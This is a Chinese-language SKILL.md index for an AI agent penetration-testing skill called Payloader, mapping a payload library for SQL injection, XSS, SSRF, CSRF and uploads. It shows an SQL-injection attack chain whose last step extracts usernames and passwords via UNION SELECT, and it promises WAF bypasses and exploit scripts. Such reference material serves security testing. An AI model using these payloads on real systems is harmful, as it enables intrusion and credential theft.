# Payloader Skill - 渗透测试辅助平台

渗透测试 payload 知识库、工具命令和攻击链模板。

## 目录结构

```
security-testing/
├── SKILL.md                      # 本文件 - 入口与索引
├── data/                         # Payload 知识库
│   ├── web/                      # Web 应用攻防
│   │   ├── sqli/                # SQL 注入
│   │   ├── xss/                # XSS 跨站脚本
│   │   ├── csrf/               # CSRF
│   │   ├── ssrf/              # SSRF
│   │   └── ...
│   ├── system/                 # 系统层攻防
│   │   ├── linux/
│   │   └── windows/
│   ├── network/                 # 网络协议
│   └── crypto/                 # 加密与编码
```

## 漏洞类别

### Web 漏洞

| 类别 | Payload 路径 |
|------|-------------|
| SQL 注入 | `data/web/sqli/` |
| XSS | `data/web/xss/` |
| SSRF | `data/web/ssrfrf/` |
| CSRF | `data/web/csrf/` |
| 文件上传 | `data/web/upload/` |

### 数据库 Payload

| 数据库 | 路径 |
|--------|------|
| MySQL | `data/web/sqli/mysql.md` |
| MSSQL | `data/web/sqli/mssql.md` |
| Oracle | `data/web/sqli/oracle.md` |
| PostgreSQL | `data/web/sqli/postgresql.md` |
| MongoDB | `data/web/sqli/mongodb.md` |
| Redis | `data/web/sqli/redis.md` |

## 攻击链模板

每个漏洞目录包含：
- **基础 Payload** - 常用测试语句
- **WAF 绕过** - 编码、混淆、拆分
- **攻击链** - 组合利用步骤
- **检测脚本** - PoC/EXP 示例

## 使用方式

作为 Skill 被调用时：
1. 分析目标特征
2. 选择对应漏洞类别
3. 获取 Payload 模板
4. 构建攻击链

## 示例

### SQL 注入攻击链

```markdown
1. 检测点: id=1
2. 基础测试: id=1' OR '1'='1
3. 确认注入: id=1 AND 1=1 (正常) vs id=1 AND 1=2 (错误)
4. 枚举数据库: id=1 UNION SELECT null,table_name FROM information_schema.tables
5. 提取数据: id=1 UNION SELECT null,username,password FROM users
```

## 重要

- 仅用于授权渗透测试
- 遵循网络安全法律法规
